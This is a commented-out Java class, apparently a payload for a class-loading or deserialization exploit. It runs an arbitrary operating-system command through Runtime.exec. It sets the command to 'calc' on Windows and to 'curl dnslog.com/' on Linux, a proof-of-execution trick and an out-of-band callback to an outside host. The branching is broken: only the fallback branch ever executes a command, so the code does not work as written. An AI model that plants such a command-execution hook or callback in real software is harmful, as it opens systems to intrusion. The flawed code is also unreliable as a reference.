//package com.classloader;
//
//import java.io.BufferedReader;
//import java.io.IOException;
//import java.io.InputStream;
//import java.io.InputStreamReader;
//import java.nio.charset.StandardCharsets;
//
//public class Command {
//	public BufferedReader execute(String args) {
//		String command = args;
//	 	String osName  = System.getProperty("os.name");
////
//	 	if (osName.startsWith("Windows")) {
//			 command = "calc";
//		 }
//		 else if (osName.startsWith("Linux")) {
//	  			command = "curl dnslog.com/";
//		 }else {
//			try {
//				Process process = Runtime.getRuntime().exec(command);
//				// 获取命令执行结果
//				InputStream in = process.getInputStream();
//				//取得命令结果的输出流
//				InputStream inputStream = process.getInputStream();
//				//用一个读输出流类去读
//				InputStreamReader isr = new InputStreamReader(inputStream, StandardCharsets.UTF_8);
//				//用缓冲器读行
//				BufferedReader br = new BufferedReader(isr);
//
//				return br;
//
//			} catch (IOException e) {
//				e.printStackTrace();
//			}
//		}
//
//		return null;
//	}
//
//}